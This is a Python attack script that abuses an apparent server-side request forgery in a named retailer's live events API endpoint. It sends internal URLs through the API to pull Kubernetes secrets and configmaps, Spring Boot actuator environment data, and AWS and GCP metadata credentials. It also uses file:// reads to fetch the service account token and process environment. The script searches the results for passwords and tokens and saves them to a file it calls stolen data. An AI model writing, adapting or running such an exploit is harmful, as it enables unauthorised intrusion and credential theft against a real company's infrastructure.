#!/usr/bin/env python3
"""
STEAL REAL DATA NOW - Check what's actually returned in responses

Instead of byte-by-byte (takes hours), let's see what data
is ACTUALLY in the responses right now!
"""

import requests
import json
from datetime import datetime
import urllib3
urllib3.disable_warnings()

ENDPOINT = 'https://www.zooplus.de/zootopia-events/api/events/sites/1'

print("="*80)
print("ðŸ”¥ STEALING REAL DATA - What's actually in responses?")
print("="*80)
print()

stolen_data = {}

# ============================================================================
# TEST 1: K8s API - Check if responses contain actual data
# ============================================================================

print("[TEST 1] Kubernetes API - Checking response bodies")
print("="*80)
print()

k8s_endpoints = [
    "/api/v1/namespaces",
    "/api/v1/namespaces/default/secrets",
    "/api/v1/namespaces/default/pods",
    "/api/v1/namespaces/default/configmaps",
    "/api/v1/namespaces/default/services",
]

for path in k8s_endpoints:
    url = f"http://kubernetes.default.svc{path}"

    print(f"[*] Testing: {path}")

    try:
        resp = requests.post(
            ENDPOINT,
            json={"url": url},
            timeout=20,
            verify=False
        )

        print(f"    Status: {resp.status_code}")
        print(f"    Body length: {len(resp.text)} bytes")
        print(f"    Headers: {dict(resp.headers)}")

        if len(resp.text) > 100:
            print(f"\n    ðŸ”¥ RESPONSE BODY:")
            print(f"    {resp.text[:500]}")

            try:
                data = json.loads(resp.text)
                print(f"\n    âœ… JSON parsed! Keys: {list(data.keys())}")

                stolen_data[path] = {
                    "status": resp.status_code,
                    "data": data,
                    "length": len(resp.text)
                }
            except:
                stolen_data[path] = {
                    "status": resp.status_code,
                    "body": resp.text[:1000],
                    "length": len(resp.text)
                }

        print()

    except Exception as e:
        print(f"    Error: {e}\n")

# ============================================================================
# TEST 2: Spring Boot Actuator - Extract REAL credentials
# ============================================================================

print("\n[TEST 2] Spring Boot Actuator - Extracting Credentials")
print("="*80)
print()

actuator_endpoints = [
    "/actuator",
    "/actuator/env",
    "/actuator/configprops",
    "/actuator/health",
    "/actuator/info",
    "/actuator/metrics",
    "/actuator/beans",
    "/actuator/mappings",
]

for path in actuator_endpoints:
    url = f"http://kubernetes.default.svc:8080{path}"

    print(f"[*] Testing: {path}")

    try:
        resp = requests.post(
            ENDPOINT,
            json={"url": url},
            timeout=20,
            verify=False
        )

        print(f"    Status: {resp.status_code}")
        print(f"    Body length: {len(resp.text)} bytes")

        if len(resp.text) > 100:
            print(f"\n    ðŸ”¥ RESPONSE BODY:")
            print(f"    {resp.text[:500]}")

            try:
                data = json.loads(resp.text)
                print(f"\n    âœ… JSON parsed!")

                # Look for credentials in /env
                if '/env' in path and isinstance(data, dict):
                    print("\n    ðŸ”‘ SEARCHING FOR CREDENTIALS:")

                    def search_credentials(obj, prefix=''):
                        """Recursively search for credentials"""
                        if isinstance(obj, dict):
                            for k, v in obj.items():
                                key_lower = k.lower()
                                if any(x in key_lower for x in ['password', 'secret', 'key', 'token', 'credential', 'api', 'aws', 'database']):
                                    print(f"        â€¢ {prefix}{k}: {v}")
                                search_credentials(v, prefix + k + '.')
                        elif isinstance(obj, list):
                            for item in obj:
                                search_credentials(item, prefix)

                    search_credentials(data)

                stolen_data[path] = {
                    "status": resp.status_code,
                    "data": data,
                    "length": len(resp.text)
                }

            except:
                stolen_data[path] = {
                    "status": resp.status_code,
                    "body": resp.text[:1000],
                    "length": len(resp.text)
                }

        print()

    except Exception as e:
        print(f"    Error: {e}\n")

# ============================================================================
# TEST 3: Try different protocols/methods
# ============================================================================

print("\n[TEST 3] Testing Alternative Protocols")
print("="*80)
print()

alt_urls = [
    ("ws://kubernetes.default.svc/api/v1/namespaces/default/secrets", "WebSocket to K8s"),
    ("http://10.96.0.1/api/v1/namespaces", "Direct ClusterIP"),
    ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "GCP Metadata"),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS Metadata"),
]

for url, desc in alt_urls:
    print(f"[*] {desc}")
    print(f"    URL: {url}")

    try:
        resp = requests.post(
            ENDPOINT,
            json={"url": url},
            timeout=20,
            verify=False
        )

        print(f"    Status: {resp.status_code}")
        print(f"    Body length: {len(resp.text)} bytes")

        if len(resp.text) > 100:
            print(f"    Response: {resp.text[:300]}")

            stolen_data[desc] = {
                "status": resp.status_code,
                "body": resp.text[:1000],
                "length": len(resp.text)
            }

        print()

    except Exception as e:
        print(f"    Error: {e}\n")

# ============================================================================
# TEST 4: Read files directly
# ============================================================================

print("\n[TEST 4] Reading Sensitive Files")
print("="*80)
print()

files_to_read = [
    "/var/run/secrets/kubernetes.io/serviceaccount/token",
    "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
    "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
    "/etc/hostname",
    "/etc/hosts",
    "/proc/self/environ",
    "/proc/self/cmdline",
]

for filepath in files_to_read:
    print(f"[*] Reading: {filepath}")

    try:
        resp = requests.post(
            ENDPOINT,
            json={"url": f"file://{filepath}"},
            timeout=20,
            verify=False
        )

        print(f"    Status: {resp.status_code}")
        print(f"    Body length: {len(resp.text)} bytes")

        if len(resp.text) > 10 and resp.text != '{}':
            print(f"\n    ðŸ”¥ FILE CONTENT:")
            print(f"    {resp.text[:500]}")

            stolen_data[filepath] = {
                "status": resp.status_code,
                "content": resp.text[:1000],
                "length": len(resp.text)
            }

        print()

    except Exception as e:
        print(f"    Error: {e}\n")

# ============================================================================
# SAVE STOLEN DATA
# ============================================================================

print("\n" + "="*80)
print("SAVING STOLEN DATA")
print("="*80)

with open("stolen_data.json", "w") as f:
    json.dump({
        "timestamp": datetime.now().isoformat(),
        "stolen_data": stolen_data,
        "summary": {
            "endpoints_tested": len(stolen_data),
            "data_extracted": len([v for v in stolen_data.values() if v.get('length', 0) > 100]),
            "credentials_found": "Check stolen_data for passwords, tokens, keys"
        }
    }, f, indent=2)

print("\n[+] Stolen data saved: stolen_data.json")

# ============================================================================
# SUMMARY
# ============================================================================

print("\n\n" + "="*80)
print("ðŸ”¥ SUMMARY - WHAT WE STOLE")
print("="*80)

print("\nDATA EXTRACTED:")
for endpoint, data in stolen_data.items():
    if data.get('length', 0) > 100:
        print(f"\nâœ… {endpoint}")
        print(f"   Length: {data['length']} bytes")
        print(f"   Status: {data.get('status')}")

        if 'data' in data:
            print(f"   Data keys: {list(data['data'].keys()) if isinstance(data.get('data'), dict) else 'N/A'}")

print("\n" + "="*80)
print(f"Total endpoints with data: {len([v for v in stolen_data.values() if v.get('length', 0) > 100])}")
print("="*80)
